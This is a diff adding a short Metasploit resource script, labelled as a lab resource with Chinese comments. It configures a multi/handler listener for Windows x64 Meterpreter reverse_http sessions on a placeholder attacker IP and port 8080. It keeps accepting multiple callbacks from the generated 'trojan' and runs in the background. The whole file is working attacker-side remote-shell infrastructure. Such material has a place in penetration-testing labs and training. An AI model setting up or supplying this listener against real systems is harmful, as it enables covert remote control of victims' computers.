@@ -1,0 +1,25 @@
+# ==========================================================
+# Lab Resource Script: Test01 MSF Listener Configuration
+# Usage: msfconsole -r msf_listenter.rc
+# ==========================================================
+
+# 1. 选择监听模块
+use exploit/multi/handler
+
+# 2. 设置 Payload (需与生成木马时保持一致)
+# 这里以 reverse_http 为例，体现协议隐蔽性研究
+set payload windows/x64/meterpreter/reverse_http
+
+# 3. 配置监听参数 (请根据你的 Kali IP 自行修改)
+set LHOST 192.168.x.x
+set LPORT 8080
+
+# 4. 高级参数设置
+# ExitOnSession 设置为 false 允许持续监听多个会话回连
+set ExitOnSession false
+set LHOST_VALIDATE true
+
+# 5. 启动监听 (后台模式)
+exploit -j -z
+
+print_status("监听器已启动，等待目标机回连...")
